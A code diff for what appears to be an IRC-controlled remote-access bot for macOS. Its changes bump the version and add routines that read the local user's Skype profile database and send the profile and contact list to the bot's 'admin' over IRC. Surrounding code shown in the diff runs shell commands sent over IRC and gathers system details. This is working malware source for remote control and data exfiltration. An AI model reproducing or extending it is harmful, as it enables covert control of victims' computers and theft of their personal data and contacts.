@@ -15,7 +15,7 @@ from time import strftime, sleep
 from StringIO import StringIO
 import skype
 
-version = "2.0.4"                                                 # bot version
+version = "2.0.5"                                                 # bot version
 
 def log(prefix, content=''):                                      # function used to log things to the console with a timestamp
     try:
@@ -96,7 +96,10 @@ def privscan(match):                                              # function to 
         return header.find(':%s!' % admin) != -1                  # checks to make sure private message is from admin
 
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
-    if type(msg) is not int:
+    if type(msg) is unicode:
+        import unicodedata
+        msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
+    elif type(msg) is not str or unicode:
         msg = str(msg)
     log('[+] Sent Data:')
     if (len(msg) > 480) or (msg.find('\n') != -1):
@@ -320,6 +323,18 @@ def full_identify():                                              # give verbose
     for line in run_shell(cmd):
         log('[>]    UP:    ',line)
         privmsg('[>]      Up:    %s' % line)
+
+    try:
+        db_path = skype.findProfile(local_user)
+        log('[>]    Skype:    ')
+        privmsg('[>]      Skype:')
+        for line in skype.printProfile(db_path):
+            log('[>]              ',line)
+            privmsg('[>]         %s' % line)
+            sleep(1)
+    except:
+        log('[>]    Skype:    None Found.')
+        privmsg('[>]      Skype:    None Found.')
     
     cmd = "system_profiler SPHardwareDataType"
     log('[>]    CMD:     ',cmd)
@@ -420,18 +435,38 @@ if __name__ == '__main__':
                 broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
 
             elif privscan('skype$profile'):
-                db_path = skype.findProfile(local_user)
-                for line in skype.printProfile(db_path):
-                    privmsg(line)
+                try:
+                    db_path = skype.findProfile(local_user)
+                    for line in skype.printProfile(db_path):
+                        privmsg(line)
+                        sleep(1)
+                except Exception as error:
+                    privmsg(str(error))
 
             elif privscan('skype$contacts'):
-                db_path = skype.findProfile(local_user)
-                for line in skype.printProfile(db_path):
-                    privmsg(line)
-                    sleep(1)
-                for line in skype.printContacts(db_path):
-                    privmsg(line)
-                    sleep(1)
+                try:
+                    db_path = skype.findProfile(local_user)
+                    for line in skype.printProfile(db_path):
+                        privmsg(line)
+                        sleep(1)
+                    for line in skype.printContacts(db_path):
+                        signal.signal(signal.SIGALRM, handler)
+                        signal.alarm(1)                              # doubles as flood prevention and input checking
+                        try:
+                            data = irc.recv ( 4096 )
+                            log('[+] Recieved:')
+                            log('[>]    ', data)
+                            if (data.find('!cancel') != -1):
+                                retcode = "Cancelled."
+                                privmsg("[X]: %s" % retcode)
+                                signal.alarm(0)
+                                break
+                        except:
+                            privmsg(line)
+                        signal.alarm(0)
+
+                except Exception as error:
+                    privmsg(str(error))
 
             elif scan('$'):
                 cmd = data.split("$", 1)[1]
